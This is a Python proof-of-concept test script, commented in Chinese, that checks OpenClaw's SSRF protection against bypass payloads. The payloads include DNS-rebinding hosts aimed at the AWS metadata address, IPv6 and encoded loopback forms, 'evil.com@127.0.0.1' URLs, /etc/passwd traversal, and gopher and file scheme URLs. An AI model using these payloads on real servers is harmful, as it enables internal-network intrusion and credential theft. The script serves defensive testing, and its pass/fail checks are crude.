#!/usr/bin/env python3
"""
PoC Test: SSRF (Server-Side Request Forgery) Bypass Testing
测试目标: OpenClaw SSRF防护模块 (ssrf.ts, fetch-guard.ts)
安全风险: DNS重绑定、私有IP绕过
"""

import socket
import dns.resolver
from typing import Dict, Any, List, Optional
from urllib.parse import urlparse


class SSRFBypassTest:
    """测试SSRF防护机制"""
    
    def __init__(self):
        self.test_results = []
        self.private_ranges = [
            ("10.0.0.0", "10.255.255.255"),      # 10.0.0.0/8
            ("172.16.0.0", "172.31.255.255"),    # 172.16.0.0/12
            ("192.168.0.0", "192.168.255.255"),  # 192.168.0.0/16
            ("127.0.0.0", "127.255.255.255"),    # 127.0.0.0/8
            ("169.254.0.0", "169.254.255.255"),  # Link-local
            ("100.64.0.0", "100.127.255.255"),   # CGNAT
            ("0.0.0.0", "0.255.255.255"),        # Current network
        ]
    
    def _ip_to_int(self, ip: str) -> int:
        """将IP转换为整数"""
        parts = ip.split('.')
        return (int(parts[0]) << 24) + (int(parts[1]) << 16) + (int(parts[2]) << 8) + int(parts[3])
    
    def _is_private_ip(self, ip: str) -> bool:
        """检查是否为私有IP"""
        try:
            ip_int = self._ip_to_int(ip)
            for start, end in self.private_ranges:
                if self._ip_to_int(start) <= ip_int <= self._ip_to_int(end):
                    return True
            return False
        except:
            return False
    
    def test_01_dns_rebinding(self) -> Dict[str, Any]:
        """测试1: DNS重绑定攻击"""
        print("[*] 测试1: DNS重绑定攻击测试...")
        
        # DNS重绑定攻击向量
        rebinding_targets = [
            # 使用特殊DNS服务
            "attacker-controlled.com",
            # 时间差攻击
            "make-20.190.159.0-rebind-169.254.169.254-rr.1u.ms",  # AWS元数据服务
            # 多A记录
            "dual-stack.example.com",
            # CNAME链
            "cname-chain.example.com",
        ]
        
        results = []
        for target in rebinding_targets:
            try:
                # 解析DNS
                answers = dns.resolver.resolve(target, 'A')
                ips = [str(rdata) for rdata in answers]
                
                has_private = any(self._is_private_ip(ip) for ip in ips)
                
                results.append({
                    "target": target,
                    "resolved_ips": ips,
                    "has_private_ip": has_private,
                    "risk": "HIGH" if has_private else "LOW"
                })
            except Exception as e:
                results.append({
                    "target": target,
                    "error": str(e)[:50]
                })
        
        result = {
            "test": "dns_rebinding",
            "results": results,
            "vulnerable": any(r.get("has_private_ip") for r in results)
        }
        self.test_results.append(result)
        return result
    
    def test_02_ipv6_bypass(self) -> Dict[str, Any]:
        """测试2: IPv6绕过技术"""
        print("[*] 测试2: IPv6绕过测试...")
        
        ipv6_payloads = [
            # IPv6本地地址
            "http://[::1]/admin",
            "http://[::ffff:127.0.0.1]/admin",
            "http://[0:0:0:0:0:0:0:1]/admin",
            "http://[::]/admin",
            # IPv6兼容地址
            "http://[::ffff:0:192.168.1.1]/admin",
            # 压缩格式
            "http://[fe80::1%25eth0]/admin",
        ]
        
        results = []
        for payload in ipv6_payloads:
            try:
                parsed = urlparse(payload)
                hostname = parsed.hostname
                
                # 检查是否为私有地址
                is_private = (
                    hostname.startswith("::") or
                    hostname.startswith("fe80:") or
                    hostname.startswith("fec0:") or
                    hostname.startswith("fc") or
                    hostname.startswith("fd") or
                    "127.0.0.1" in hostname or
                    "192.168" in hostname
                )
                
                results.append({
                    "payload": payload,
                    "hostname": hostname,
                    "is_private": is_private,
                    "bypass_possible": is_private
                })
            except Exception as e:
                results.append({
                    "payload": payload,
                    "error": str(e)[:50]
                })
        
        result = {
            "test": "ipv6_bypass",
            "results": results,
            "vulnerable": any(r.get("bypass_possible") for r in results)
        }
        self.test_results.append(result)
        return result
    
    def test_03_url_encoding_bypass(self) -> Dict[str, Any]:
        """测试3: URL编码绕过"""
        print("[*] 测试3: URL编码绕过...")
        
        encoding_payloads = [
            # 点号编码
            "http://127.0.0.1/admin",
            "http://127%2e0%2e0%2e1/admin",
            "http://2130706433/admin",  # 整数IP
            "http://0x7f000001/admin",  # 十六进制
            # @符号绕过
            "http://evil.com@127.0.0.1/admin",
            "http://127.0.0.1#@evil.com/admin",
            # 路径遍历
            "http://example.com/../../../../../etc/passwd",
            "http://example.com/..%2f..%2f..%2fetc/passwd",
            # 空字节（如果后端使用C/C++）
            "http://127.0.0.1%00.example.com/admin",
        ]
        
        results = []
        for payload in encoding_payloads:
            try:
                parsed = urlparse(payload)
                
                # 分析URL组件
                analysis = {
                    "payload": payload,
                    "scheme": parsed.scheme,
                    "netloc": parsed.netloc,
                    "path": parsed.path,
                    "suspicious": False
                }
                
                # 检查可疑模式
                if "@" in parsed.netloc and parsed.netloc.index("@") > 0:
                    analysis["suspicious"] = True
                    analysis["type"] = "credential_override"
                elif "%" in parsed.netloc:
                    analysis["suspicious"] = True
                    analysis["type"] = "encoded"
                elif parsed.netloc.replace(".", "").isdigit():
                    analysis["suspicious"] = True
                    analysis["type"] = "numeric_ip"
                
                results.append(analysis)
            except Exception as e:
                results.append({
                    "payload": payload,
                    "error": str(e)[:50]
                })
        
        result = {
            "test": "url_encoding_bypass",
            "results": results,
            "vulnerable": any(r.get("suspicious") for r in results)
        }
        self.test_results.append(result)
        return result
    
    def test_04_redirect_bypass(self) -> Dict[str, Any]:
        """测试4: 重定向绕过测试"""
        print("[*] 测试4: 重定向绕过...")
        
        # 重定向链攻击
        redirect_chains = [
            # 开放重定向
            "https://example.com/redirect?url=http://127.0.0.1",
            "https://example.com/redirect?url=file:///etc/passwd",
            # 协议切换
            "http://example.com → https://127.0.0.1",
            # 多重重定向
            "http://a.com → http://b.com → http://127.0.0.1",
        ]
        
        results = []
        for chain in redirect_chains:
            has_private = "127.0.0.1" in chain or "file://" in chain
            results.append({
                "redirect_chain": chain,
                "targets_private": has_private,
                "risk": "HIGH" if has_private else "MEDIUM"
            })
        
        result = {
            "test": "redirect_bypass",
            "results": results,
            "vulnerable": any(r.get("targets_private") for r in results),
            "note": "重定向链可能绕过初始URL验证"
        }
        self.test_results.append(result)
        return result
    
    def test_05_protocol_handler_bypass(self) -> Dict[str, Any]:
        """测试5: 协议处理器绕过"""
        print("[*] 测试5: 协议处理器绕过...")
        
        protocol_payloads = [
            # 文件协议
            "file:///etc/passwd",
            "file://localhost/etc/passwd",
            "file:////server/share/file.txt",
            # FTP协议
            "ftp://anonymous@127.0.0.1/",
            "ftp://127.0.0.1:21/",
            # Gopher协议
            "gopher://127.0.0.1:9001/x",
            # dict协议
            "dict://127.0.0.1:2628/x",
            # LDAP
            "ldap://127.0.0.1:389/dc=example,dc=com",
        ]
        
        results = []
        for payload in protocol_payloads:
            try:
                parsed = urlparse(payload)
                dangerous_protocols = ['file', 'ftp', 'gopher', 'dict', 'ldap']
                
                is_dangerous = parsed.scheme in dangerous_protocols
                
                results.append({
                    "payload": payload,
                    "scheme": parsed.scheme,
                    "dangerous": is_dangerous,
                    "bypass_possible": is_dangerous
                })
            except Exception as e:
                results.append({
                    "payload": payload,
                    "error": str(e)[:50]
                })
        
        result = {
            "test": "protocol_handler_bypass",
            "results": results,
            "vulnerable": any(r.get("bypass_possible") for r in results)
        }
        self.test_results.append(result)
        return result
    
    def test_06_cidr_bypass(self) -> Dict[str, Any]:
        """测试6: CIDR绕过测试"""
        print("[*] 测试6: CIDR绕过测试...")
        
        cidr_tests = [
            # 测试CIDR边界
            ("10.0.0.0", True, "Class A网络边界"),
            ("10.255.255.255", True, "Class A广播地址"),
            ("11.0.0.0", False, "Class A后第一个地址"),
            ("172.16.0.0", True, "Class B网络边界"),
            ("172.31.255.255", True, "Class B广播地址"),
            ("172.32.0.0", False, "Class B后第一个地址"),
            ("192.168.0.0", True, "Class C网络边界"),
            ("192.168.255.255", True, "Class C广播地址"),
            ("192.169.0.0", False, "Class C后第一个地址"),
        ]
        
        results = []
        for ip, expected_private, desc in cidr_tests:
            detected_private = self._is_private_ip(ip)
            results.append({
                "ip": ip,
                "description": desc,
                "expected_private": expected_private,
                "detected_private": detected_private,
                "match": expected_private == detected_private
            })
        
        all_match = all(r["match"] for r in results)
        
        result = {
            "test": "cidr_boundary",
            "results": results,
            "vulnerable": not all_match,
            "note": "CIDR边界检查是SSRF防护的关键"
        }
        self.test_results.append(result)
        return result
    
    def generate_report(self) -> str:
        """生成测试报告"""
        report_lines = [
            "=" * 70,
            "SSRF Bypass Security Test Report",
            "=" * 70,
            "",
            f"Tests Run: {len(self.test_results)}",
            ""
        ]
        
        for result in self.test_results:
            status = "⚠️ VULNERABLE" if result.get("vulnerable") else "✅ PASSED"
            report_lines.append(f"{status}: {result.get('test', 'unknown')}")
            
            if "results" in result:
                vulnerable_count = sum(1 for r in result["results"] 
                                      if r.get("bypass_possible") or r.get("has_private_ip"))
                if vulnerable_count > 0:
                    report_lines.append(f"  Vulnerable vectors: {vulnerable_count}/{len(result['results'])}")
            
            if "note" in result:
                report_lines.append(f"  Note: {result['note']}")
        
        report_lines.extend([
            "",
            "=" * 70,
            "Security Recommendations:",
            "1. 使用固定DNS查找(resolvePinnedHostname)并缓存结果",
            "2. 禁用不必要的URL协议(file://, ftp://, gopher://等)",
            "3. 实施严格的重定向策略，每次重定向都重新验证",
            "4. 使用防火墙规则阻止出站连接到私有IP范围",
            "5. 实施URL标准化，解码所有编码字符后再验证",
            "6. 考虑使用沙箱环境执行外部请求",
            "7. 对DNS响应实施TTL检查和缓存固定"
        ])
        
        return "\n".join(report_lines)


def main():
    """主函数"""
    print("🔒 OpenClaw SSRF Bypass Security PoC Test")
    print("=" * 70)
    
    tester = SSRFBypassTest()
    
    tester.test_01_dns_rebinding()
    tester.test_02_ipv6_bypass()
    tester.test_03_url_encoding_bypass()
    tester.test_04_redirect_bypass()
    tester.test_05_protocol_handler_bypass()
    tester.test_06_cidr_bypass()
    
    report = tester.generate_report()
    print("\n" + report)
    
    # 保存报告
    with open("/Users/xdrshjr/.openclaw/workspace/openclaw-security-analysis/tests/test-03-ssrf-bypass-report.txt", "w") as f:
        f.write(report)
    
    print("\n💾 报告已保存到 tests/test-03-ssrf-bypass-report.txt")


if __name__ == "__main__":
    main()
